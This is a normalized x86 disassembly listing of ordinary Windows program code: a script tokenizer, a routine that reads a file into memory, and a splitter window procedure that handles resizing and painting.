fadd [ esi + 0x10008 ]
fstp [ esi + 0x10008 ]
mov eax [ edi ]
sub eax edx
inc eax
push eax
cmp al 0x39
jg r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ esi + 0x10008 ]
movsx eax al
lea ecx [ ecx + ecx * 4 ]
lea ecx [ eax + ecx * 2 - 0x30 ]
mov [ esi + 0x10008 ] ecx
inc [ edi ]
jmp r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x46
jg r-xdata
mov ecx [ esi + 0x10008 ]
sub ecx ebx
movsx eax al
shl ecx 0x4
add ecx eax
mov [ esi + 0x10008 ] ecx
inc [ edi ]
jmp r-xdata
mov ecx [ edi ]
sub ecx edx
inc ecx
push ecx
jmp r-xdata
cmp al 0x66
jg r-xdata
mov ecx [ esi + 0x10008 ]
movsx eax al
shl ecx 0x4
lea ecx [ ecx + eax - 0x37 ]
mov [ esi + 0x10008 ] ecx
inc [ edi ]
jmp r-xdata
push edx
add esi 0x8
push esi
call [ lstrcpynA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x3
pop ebx
pop ecx
retn 0x4
mov ecx [ esi + 0x10008 ]
movsx eax al
shl ecx 0x4
lea ecx [ ecx + eax - 0x57 ]
mov [ esi + 0x10008 ] ecx
inc [ edi ]
jmp r-xdata
sub_44fa00
push ecx
mov eax [ esp + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov dl [ esi ]
inc esi
mov [ eax ] esi
add ecx 0x8
xor bl bl
cmp [ esi ] dl
mov [ esp + 0x10 ] dl
je r-xdata
inc esi
mov [ eax ] esi
jmp r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
pop esi
mov [ ecx ] 0x0
pop ebx
pop ecx
retn 0x4
test bl bl
jne r-xdata
xor bl bl
cmp dl 0x5c
jne r-xdata
cmp dl 0x80
jb r-xdata
lea edx [ esi + 0x1 ]
mov [ eax ] edx
mov dl [ edx ]
cmp dl 0x6e
jne r-xdata
cmp dl 0xe0
jb r-xdata
cmp dl 0xa0
jbe r-xdata
cmp dl 0x5c
jne r-xdata
mov [ ecx ] 0xd
inc ecx
mov [ ecx ] 0xa
jmp r-xdata
cmp dl 0xff
ja r-xdata
mov bl 0x1
jmp r-xdata
cmp dl 0x27
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
mov edx [ eax ]
inc ecx
inc edx
mov [ eax ] edx
mov [ esp + 0x8 ] eax
mov al [ esp + 0x10 ]
cmp [ edx ] al
mov eax [ esp + 0x8 ]
mov esi edx
jne r-xdata
mov edx [ eax ]
mov dl [ edx ]
mov [ ecx ] dl
cmp dl 0x22
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
mov [ ecx ] dl
jmp r-xdata
sub_44fab0
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push ebx
mov bl [ edx ]
inc edx
push esi
mov esi ecx
mov [ eax ] edx
mov cl [ edx ]
add esi 0x8
cmp cl bl
je r-xdata
inc edx
mov [ eax ] edx
mov cl [ edx ]
test cl cl
je r-xdata
mov [ esi ] 0x0
pop esi
pop ebx
retn 0x4
cmp cl 0x80
jb r-xdata
cmp cl 0xe0
jb r-xdata
cmp cl 0xa0
jbe r-xdata
mov cl [ edx ]
mov [ esi ] cl
mov ecx [ eax ]
inc esi
inc ecx
mov [ eax ] ecx
cmp [ ecx ] bl
mov edx ecx
jne r-xdata
cmp cl 0xff
ja r-xdata
mov [ esi ] cl
mov ecx [ eax ]
inc esi
inc ecx
mov [ eax ] ecx
mov edx ecx
sub_44fb60
push edi
mov edi ecx
mov al [ edi + 0x10014 ]
test al al
je r-xdata
push ebx
push esi
mov [ edi + 0x10014 ] 0x1
lea esi [ edi + 0x1000c ]
mov eax [ edi + 0x10018 ]
pop edi
retn
test eax eax
je r-xdata
inc eax
mov [ edi + 0x1001c ] eax
jmp r-xdata
cmp bl 0x20
je r-xdata
test bl bl
je r-xdata
mov eax [ esi ]
mov bl [ eax ]
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
mov eax [ edi + 0x1001c ]
je r-xdata
inc [ esi ]
jmp r-xdata
cmp bl 0x9
je r-xdata
pop esi
pop ebx
xor eax eax
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
cmp bl 0x81
jne r-xdata
cmp bl 0x80
jb r-xdata
dec [ edi + 0x1001c ]
jmp r-xdata
test bl bl
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x1 ] 0x40
jne r-xdata
cmp bl 0xe0
jb r-xdata
cmp bl 0x9f
jbe r-xdata
cmp bl 0xd
jne r-xdata
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
add eax 0x2
mov [ esi ] eax
jmp r-xdata
cmp bl 0xff
ja r-xdata
add [ esi ] 0x2
jmp r-xdata
cmp bl 0xa
jne r-xdata
mov eax [ esi ]
push r--data
push esi
mov ecx edi
mov [ edi + 0x10010 ] eax
call sub_44f710
test al al
je r-xdata
mov ecx [ esi ]
mov al [ ecx ]
cmp al 0xa
je r-xdata
mov ecx [ esi ]
mov eax [ edi + 0x4 ]
inc ecx
inc eax
mov [ esi ] ecx
mov [ edi + 0x4 ] eax
jmp r-xdata
push r--data
push esi
mov ecx edi
call sub_44f710
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x20
pop edi
retn
mov ecx [ edi + 0x4 ]
mov eax [ esi ]
inc ecx
inc eax
mov [ edi + 0x4 ] ecx
mov [ esi ] eax
jmp r-xdata
cmp al 0x80
jb r-xdata
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x21
pop edi
retn
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x31
pop edi
retn
inc ecx
cmp al 0xff
ja r-xdata
add ecx 0x2
jmp r-xdata
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x33
pop edi
retn
mov edx ecx
cmp [ edx ] 0xa
jne r-xdata
mov [ esi ] ecx
mov al [ ecx ]
test al al
je r-xdata
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x34
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x35
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x38
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x39
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x3a
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x3b
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x3d
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x37
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
pop esi
pop ebx
mov eax 0x36
pop edi
retn
cmp bl 0x3c
jne r-xdata
pop esi
pop ebx
mov eax 0x2f
pop edi
retn
cmp bl 0x3e
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x30
pop edi
retn
push esi
mov ecx edi
call sub_44f7c0
test eax eax
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x32
pop edi
retn
pop esi
pop ebx
pop edi
retn
cmp bl 0x2e
jne r-xdata
cmp bl 0x2c
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x13
pop edi
retn
cmp bl 0x40
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x14
pop edi
retn
cmp bl 0x3f
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x15
pop edi
retn
cmp bl 0x23
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x16
pop edi
retn
cmp bl 0x3b
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x7
pop edi
retn
cmp bl 0x3a
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x8
pop edi
retn
cmp bl 0x2b
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x9
pop edi
retn
cmp bl 0x2d
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0xa
pop edi
retn
cmp bl 0x2a
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0xb
pop edi
retn
cmp bl 0x2f
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0xc
pop edi
retn
cmp bl 0x25
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0xd
pop edi
retn
cmp bl 0x7c
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x2e
pop edi
retn
cmp bl 0x26
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0xe
pop edi
retn
cmp bl 0x5e
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0xf
pop edi
retn
cmp bl 0x7e
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x10
pop edi
retn
cmp bl 0x21
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x11
pop edi
retn
cmp bl 0x7b
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x12
pop edi
retn
cmp bl 0x7d
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x17
pop edi
retn
cmp bl 0x28
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x18
pop edi
retn
cmp bl 0x29
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x19
pop edi
retn
cmp bl 0x5b
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x1a
pop edi
retn
cmp bl 0x5d
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x1b
pop edi
retn
cmp bl 0x3d
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x1c
pop edi
retn
cmp bl 0x27
mov ecx edi
push esi
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x3c
pop edi
retn
cmp bl 0x22
jne r-xdata
call sub_44fa00
pop esi
pop ebx
mov eax 0x1d
pop edi
retn
call sub_44f760
mov dl [ edi + 0x8 ]
xor eax eax
test dl dl
setne al
inc eax
call sub_44fa00
pop esi
pop ebx
mov eax 0x1e
pop edi
retn
sub_44ffe0
push edi
mov edi ecx
mov al [ edi + 0x10014 ]
test al al
je r-xdata
push ebx
push esi
mov [ edi + 0x10014 ] 0x1
lea esi [ edi + 0x1000c ]
mov eax [ edi + 0x10018 ]
pop edi
retn
test eax eax
je r-xdata
inc eax
mov [ edi + 0x1001c ] eax
jmp r-xdata
cmp bl 0x20
je r-xdata
test bl bl
je r-xdata
mov eax [ esi ]
mov bl [ eax ]
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
mov eax [ edi + 0x1001c ]
je r-xdata
inc [ esi ]
jmp r-xdata
cmp bl 0x9
je r-xdata
pop esi
pop ebx
xor eax eax
pop edi
retn
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
cmp bl 0x81
jne r-xdata
cmp bl 0x80
jb r-xdata
dec [ edi + 0x1001c ]
jmp r-xdata
test bl bl
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x1 ] 0x40
jne r-xdata
cmp bl 0xe0
jb r-xdata
cmp bl 0x9f
jbe r-xdata
cmp bl 0xd
jne r-xdata
push r--data
push esi
mov ecx edi
call sub_44f6e0
test al al
je r-xdata
add eax 0x2
mov [ esi ] eax
jmp r-xdata
cmp bl 0xff
ja r-xdata
add [ esi ] 0x2
jmp r-xdata
cmp bl 0xa
jne r-xdata
mov eax [ esi ]
push esi
mov ecx edi
mov [ edi + 0x10010 ] eax
call sub_44f7c0
test eax eax
jne r-xdata
mov ecx [ esi ]
mov al [ ecx ]
cmp al 0xa
je r-xdata
mov ecx [ esi ]
mov eax [ edi + 0x4 ]
inc ecx
inc eax
mov [ edi + 0x10024 ] 0x1
mov [ esi ] ecx
mov [ edi + 0x4 ] eax
jmp r-xdata
pop esi
pop ebx
pop edi
retn
cmp bl 0x2d
jne r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ esi ]
inc ecx
inc eax
mov [ edi + 0x4 ] ecx
mov [ esi ] eax
jmp r-xdata
lea ebx [ ebx ]
cmp bl 0x2c
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0xb
pop edi
retn
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
cmp bl 0x22
mov ecx edi
push esi
jne r-xdata
inc [ esi ]
pop esi
pop ebx
mov eax 0x14
pop edi
retn
inc ecx
cmp al 0xff
ja r-xdata
add ecx 0x2
jmp r-xdata
call sub_44f760
mov dl [ edi + 0x8 ]
xor eax eax
test dl dl
setne al
inc eax
call sub_44fab0
pop esi
pop ebx
mov eax 0x1e
pop edi
retn
mov edx ecx
cmp [ edx ] 0xa
jne r-xdata
mov [ esi ] ecx
mov al [ ecx ]
test al al
je r-xdata
cmp al 0x80
jb r-xdata
sub_450170
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x10020 ]
test eax eax
push edi
je r-xdata
mov ecx esi
call sub_44f610
mov eax [ esp + 0x10 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push eax
call [ GlobalFree@IAT ]
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push ebx
push 0x0
push edi
call [ GetFileSize@IAT ]
mov ebx eax
lea eax [ ebx + 0x1 ]
push eax
push 0x40
call [ GlobalAlloc@IAT ]
test eax eax
mov [ esi + 0x10020 ] eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
pop ecx
retn 0x4
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebp
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push ebx
push eax
push edi
call [ ReadFile@IAT ]
push edi
mov ebp eax
call [ CloseHandle@IAT ]
test ebp ebp
pop ebp
jne r-xdata
push edi
call [ CloseHandle@IAT ]
pop ebx
pop edi
mov eax 0x2
pop esi
pop ecx
retn 0x4
mov eax [ esi + 0x10020 ]
mov [ ebx + eax ] 0x0
mov eax [ esi + 0x10020 ]
pop ebx
mov [ esi + 0x1000c ] eax
mov [ esi + 0x10010 ] eax
pop edi
xor eax eax
pop esi
pop ecx
retn 0x4
mov edx [ esi + 0x10020 ]
push edx
call [ GlobalFree@IAT ]
pop ebx
pop edi
mov [ esi + 0x10020 ] 0x0
mov eax 0x3
pop esi
pop ecx
retn 0x4
sub_450280
push ebx
push esi
mov esi ecx
call sub_44ffe0
mov dl [ esi + 0x10024 ]
xor bl bl
cmp dl 0x1
mov ecx 0x14
jne r-xdata
cmp [ esi + 0x10018 ] ecx
je r-xdata
cmp eax ecx
mov [ esi + 0x10024 ] bl
jne r-xdata
cmp eax 0xb
mov [ esi + 0x10018 ] eax
jne r-xdata
cmp eax ecx
jne r-xdata
mov [ esi + 0x10018 ] ecx
pop esi
mov eax ecx
pop ebx
retn
mov eax [ esi + 0x10018 ]
pop esi
pop ebx
retn
mov ecx esi
mov [ esi + 0x10014 ] bl
call sub_450280
cmp eax 0x3
mov [ esi + 0x10018 ] eax
jne r-xdata
mov ecx esi
mov [ esi + 0x10014 ] bl
call sub_44ffe0
mov [ esi + 0x10024 ] bl
cmp eax 0x4
jne r-xdata
mov eax [ esi + 0x10008 ]
neg eax
mov [ esi + 0x10008 ] eax
mov eax [ esi + 0x10018 ]
pop esi
pop ebx
retn
mov [ esi + 0x10018 ] 0x1
fld [ esi + 0x10008 ]
mov eax [ esi + 0x10018 ]
fchs
fstp [ esi + 0x10008 ]
pop esi
pop ebx
retn
sub_450340
push esi
mov esi ecx
mov al [ esi + 0x10014 ]
test al al
je r-xdata
mov eax [ esi + 0x1000c ]
mov ecx esi
mov [ esi + 0x10010 ] eax
call sub_450280
mov [ esi + 0x10014 ] 0x0
pop esi
retn
mov eax [ esi + 0x10018 ]
mov [ esi + 0x10014 ] 0x0
pop esi
retn
sub_450380
push esi
mov esi ecx
mov al [ esi + 0x10014 ]
test al al
je r-xdata
mov ecx esi
call sub_450270
mov [ esi + 0x10014 ] 0x0
pop esi
retn
mov eax [ esi + 0x10018 ]
mov [ esi + 0x10014 ] 0x0
pop esi
retn
sub_4503b0
push 0xffffffff
push sub_4c07d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
xor ebx ebx
push esi
mov [ esp + 0x8 ] ebx
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
mov eax [ ecx + 0x10010 ]
mov ecx [ ecx + 0x1000c ]
sub ecx eax
push ecx
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x38 ] ebx
call sub_401e80
mov esi [ esp + 0x38 ]
push 0xffffffff
push ebx
lea edx [ esp + 0x14 ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edx
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov ecx [ esp + 0x28 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn 0x4
mov eax [ esp + 0x10 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_450450
push esi
mov esi [ esp + 0x8 ]
push edi
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
mov edi eax
mov eax [ esp + 0x10 ]
cmp eax 0x46
je r-xdata
test edi edi
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
push eax
push esi
call [ DefWindowProcA@IAT ]
pop edi
pop esi
retn 0x10
pop edi
xor eax eax
pop esi
retn 0x10
mov eax [ esp + 0x18 ]
push ebx
mov ebx [ eax + 0x10 ]
push ebp
mov ebp [ eax + 0x14 ]
cmp [ edi + 0xc ] 0x2
mov eax [ edi ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov esi [ rw-data ]
cmp esi ebp
jle r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov al [ rw-data ]
mov edx [ rw-data ]
neg al
sbb eax eax
and eax edx
mov esi eax
lea eax [ ebx + 0x4 ]
cmp esi eax
jle r-xdata
mov esi [ esp + 0x20 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
sub ebp esi
mov [ esp + 0x20 ] ebp
jns r-xdata
mov esi ebp
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
test [ rw-data ] 0x8
je r-xdata
sub ebx esi
jns r-xdata
mov esi eax
jmp r-xdata
mov edx [ edi + 0x4 ]
mov ebp [ MoveWindow@IAT ]
push 0x1
push esi
push ebx
push 0x0
push 0x0
push edx
call ebp
mov eax [ esp + 0x20 ]
mov ecx [ edi + 0x8 ]
push 0x1
push eax
push ebx
push esi
push 0x0
push ecx
call ebp
mov edx [ edi + 0x8 ]
mov esi [ InvalidateRect@IAT ]
push 0x1
push 0x0
push edx
call esi
mov eax [ edi + 0x4 ]
push 0x1
push 0x0
push eax
call esi
pop ebp
pop ebx
mov [ esp + 0x20 ] 0x0
lea esi [ ebp + 0x8 ]
mov eax [ rw-data ]
mov esi ebp
sub esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
mov esi [ rw-data ]
mov edx [ rw-data ]
neg esi
sbb esi esi
and esi edx
lea eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
lea esi [ ebx + 0x4 ]
mov eax [ rw-data ]
mov esi ebx
sub esi eax
jmp r-xdata
mov ecx [ edi + 0x8 ]
push 0x4
push ebp
push ebx
mov ebx [ SetWindowPos@IAT ]
push 0x0
push esi
push 0x0
push ecx
call ebx
mov edx [ edi + 0x4 ]
push 0x4
push ebp
push esi
push 0x0
push 0x0
push 0x0
push edx
call ebx
mov eax [ edi + 0x8 ]
mov esi [ InvalidateRect@IAT ]
push 0x1
push 0x0
push eax
call esi
mov ecx [ edi + 0x4 ]
push 0x1
push 0x0
push ecx
call esi
pop ebp
pop ebx
pop edi
xor eax eax
pop esi
retn 0x10
xor ebx ebx
mov esi 0x8
jmp r-xdata
cmp esi 0x8
jge r-xdata
mov esi eax
jmp r-xdata
mov esi 0x4
jmp r-xdata
cmp esi 0x4
jge r-xdata
sub_450610
sub esp 0x10c
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x120 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi [ esp + 0x124 ]
cmp esi 0x2c
mov ebp [ esp + 0x12c ]
mov ebx eax
mov [ esp + 0x24 ] ebx
ja r-xdata
cmp esi 0x200
ja r-xdata
cmp esi 0x2b
jae r-xdata
sub esi 0x201
je r-xdata
je r-xdata
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
cmp [ rw-data ] edi
je r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x1f
ja r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
dec esi
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp esi 0x4e
je r-xdata
mov edx [ esp + 0x12c ]
mov eax [ esp + 0x128 ]
push edx
push eax
push esi
call sub_4323b0
add esp 0xc
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ esp + 0x12c ]
mov edx [ esp + 0x128 ]
mov eax [ esp + 0x124 ]
push ecx
push edx
push eax
push edi
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10c
retn 0x10
movzx eax [ eax + lookup_table_451308 ]
jmp [ eax * 4 + jump_table_4512f4 ]
mov [ esp + 0x10 ] 0x8
cmp eax [ rw-data ]
mov [ esp + 0x10 ] 0x4
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
lea edx [ esp + 0x28 ]
push edx
push edi
call [ GetClientRect@IAT ]
movsx ebx [ esp + 0x12e ]
cmp edi [ rw-data ]
mov esi [ esp + 0x30 ]
movsx ecx bp
mov ebp [ esp + 0x34 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
cmp esi 0x117
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10c
retn 0x10
lea ecx [ esp + 0x1c ]
push ecx
call [ GetCursorPos@IAT ]
lea edx [ esp + 0x28 ]
push edx
push edi
call [ GetClientRect@IAT ]
lea eax [ esp + 0x1c ]
push eax
push edi
call [ ScreenToClient@IAT ]
mov eax [ ebx + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
test ebx ebx
je r-xdata
lea eax [ esp + 0xdc ]
push eax
push edi
call [ BeginPaint@IAT ]
mov ebp eax
cmp edi [ rw-data ]
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10c
retn 0x10
cmp edi [ rw-data ]
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax ebp
sub eax edx
cdq
sub eax edx
sar eax 0x1
lea edx [ eax - 0x14 ]
cmp edx ecx
jge r-xdata
lea ecx [ esp + 0x28 ]
push ecx
push edi
call [ GetClientRect@IAT ]
movsx esi [ esp + 0x12c ]
movsx ecx [ esp + 0x12e ]
cmp edi [ rw-data ]
mov ebp [ esp + 0x34 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] ecx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call [ ReleaseCapture@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
mov ebp 0x8
cmp eax [ rw-data ]
mov ebp 0x4
jne r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax ebp
sub eax edx
cdq
sub eax edx
sar eax 0x1
lea edx [ eax - 0x14 ]
cmp edx ebx
jge r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
cmp [ rw-data ] edi
je r-xdata
mov ecx 0x8
cmp eax [ rw-data ]
mov ecx 0x4
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10c
retn 0x10
mov eax [ ebx + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x30 ]
sub eax edx
cdq
sub eax edx
sar eax 0x1
lea edx [ eax - 0x14 ]
cmp edx [ esp + 0x1c ]
jge r-xdata
add eax 0x14
cmp ecx eax
jl r-xdata
call [ ReleaseCapture@IAT ]
mov eax [ rw-data ]
mov edx 0x2
cmp eax edx
mov [ rw-data ] edx
je r-xdata
cmp edi [ rw-data ]
mov esi [ SendMessageA@IAT ]
mov [ rw-data ] 0x0
jne r-xdata
lea ecx [ esp + 0x28 ]
push ecx
push edi
mov edi [ GetWindowRect@IAT ]
call edi
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] eax
mov edx [ ebx + 0x4 ]
push ecx
push edx
call [ ScreenToClient@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x20 ]
cmp eax 0x1
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x10 ] ebp
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x28 ]
mov eax esi
sub eax edx
cdq
sub eax edx
sar eax 0x1
lea edx [ eax - 0x14 ]
cmp edx ecx
jge r-xdata
add eax 0x14
cmp ebx eax
jge r-xdata
mov ecx [ esp + 0x128 ]
push ebp
push ecx
push edi
call sub_42e070
add esp 0xc
jmp r-xdata
mov ecx [ esp + 0x12c ]
mov edx [ esp + 0x128 ]
push ecx
push edx
push 0x117
call sub_4323b0
add esp 0xc
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebx + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x84
add ecx 0x7f00
mov edx eax
sub edx ecx
cmp esi edx
jl r-xdata
mov eax [ ebx + 0x10 ]
mov esi [ esp + 0x20 ]
test eax eax
mov eax [ esp + 0x34 ]
je r-xdata
mov ecx 0x8
cmp eax [ rw-data ]
mov ecx 0x4
jne r-xdata
lea ecx [ esp + 0xdc ]
push ecx
push edi
call [ EndPaint@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ GetSysColor@IAT ]
push 0x15
call esi
mov ebx [ CreatePen@IAT ]
push eax
push 0x1
push 0x0
call ebx
push 0x14
mov [ esp + 0x1c ] eax
call esi
push eax
push 0x1
push 0x0
call ebx
push 0xf
mov [ esp + 0x18 ] eax
call esi
push eax
push 0x1
push 0x0
call ebx
mov ecx [ esp + 0x18 ]
mov ebx [ SelectObject@IAT ]
push ecx
push ebp
mov [ esp + 0x18 ] eax
call ebx
lea edx [ esp + 0xb0 ]
push edx
push edi
mov [ esp + 0x44 ] eax
call [ GetClientRect@IAT ]
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax ebp
sub eax edx
cmp ecx eax
jl r-xdata
mov edx [ esp + 0x1c ]
add eax 0x14
cmp edx eax
jge r-xdata
push 0x0
push 0x0
push edi
call [ InvalidateRect@IAT ]
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ esp + 0x128 ]
mov eax [ rw-data ]
push ebp
push edx
push 0x5
push eax
call [ SendMessageA@IAT ]
mov ecx [ ebx + 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov edx [ rw-data ]
push 0x0
push 0x105
push 0x111
push edx
call esi
movsx esi [ esp + 0x12c ]
mov edx [ rw-data ]
mov ebx [ esp + 0x34 ]
mov ecx [ esp + 0x2c ]
add esi edx
sub ebx ecx
cmp esi ebp
jge r-xdata
movsx ebx [ esp + 0x12e ]
mov ecx [ rw-data ]
mov esi [ esp + 0x30 ]
mov edx [ esp + 0x28 ]
add ebx ecx
sub esi edx
cmp ebx ebp
jge r-xdata
push 0x0
push 0x0
push edi
mov [ rw-data ] 0x0
call [ InvalidateRect@IAT ]
jmp r-xdata
add eax 0x14
cmp ecx eax
jge r-xdata
lea eax [ esi - 0x8 ]
cmp eax ecx
jge r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10c
retn 0x10
cmp edi [ rw-data ]
jne r-xdata
sub eax [ esp + 0x2c ]
cdq
sub eax edx
sar eax 0x1
lea edx [ eax - 0x14 ]
cmp edx esi
jge r-xdata
mov ecx 0x7f85
jmp r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
